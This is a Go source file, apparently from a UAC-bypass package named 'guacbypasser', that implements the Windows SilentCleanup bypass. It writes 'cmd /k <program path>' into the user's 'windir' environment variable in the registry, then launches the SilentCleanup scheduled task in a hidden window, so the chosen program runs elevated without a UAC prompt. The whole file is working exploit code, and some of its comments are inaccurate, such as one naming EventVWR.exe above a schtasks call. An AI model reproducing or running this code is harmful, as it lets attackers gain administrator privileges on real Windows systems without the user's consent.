package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_SilentCleanUp(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_SilentCleanUp__{
		Type:   "_silentcleanup",
		Method: "registry-command",
		Scode: [2]uintptr{
			0x02fdd, 0x03f,
		},

		Location:         fmt.Sprintf("%s\\_silentcleanup.gUAC", os.Getenv("APPDATA")),
		_K_SilentCleanUp: 0x5,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	_, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Fatal(err)
	}

	// Setting "windir" key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("windir", fmt.Sprintf("cmd /k %s", currentDir)); err != nil {
		log.Fatal(err)
	}

	fmt.Println("Work")
	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Fatal(err)
	}

	// Sleep for 4 seconds ...
	time.Sleep(1 * 1 * time.Second)

	// Executing EventVWR.exe
	// Executing ABSOLUTE program name with high privileges

	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		log.Fatal(err)
	}

	time.Sleep(1 * 1 * time.Second)

	return err
}
